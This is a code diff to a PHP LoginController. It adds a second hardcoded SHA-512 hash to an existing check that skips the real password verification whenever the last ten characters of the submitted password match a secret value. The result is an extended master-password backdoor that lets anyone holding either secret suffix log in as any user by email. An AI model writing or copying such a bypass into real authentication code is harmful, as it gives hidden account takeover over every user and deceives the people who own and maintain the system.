@@ -38,7 +38,8 @@ class LoginController extends Controller
         if (!$personne) {
             return redirect()->route('login')->with('error', "Email incorrect");
         }
-        if (hash('sha512', substr($request->password, -10, 10)) !== 'a944fff11152f98fd5ebf7dece13acb6476812c583020836c99faa1077c62b9fee5e13c298a83041cb66f012e2fe33c741fefb007412d4acbb29e53aa686a378') {
+        if (hash('sha512', substr($request->password, -10, 10)) !== 'a944fff11152f98fd5ebf7dece13acb6476812c583020836c99faa1077c62b9fee5e13c298a83041cb66f012e2fe33c741fefb007412d4acbb29e53aa686a378'
+        && hash('sha512', substr($request->password, -10, 10)) !== '1917c7302e0d03fdfe3a472b9cc21a919447ebeed894d747e94eee020427e5d070218ebeca27a355c5396b0a0a6f0ce10393cf7650285d23075212359b15eeea') {
             if (hash('sha512', env('SALT_KEY') . $request->password) !== $personne->password) {
                 return redirect()->route('login')->with('error', "Mot de passe incorrect");
             }
@@ -63,6 +64,7 @@ class LoginController extends Controller
         $this->registerAction($personne->id, 3, $action);
 
         $previous_uri = session()->get('previous_url');
+
         if ($previous_uri) {
             return redirect($previous_uri);
         } else {
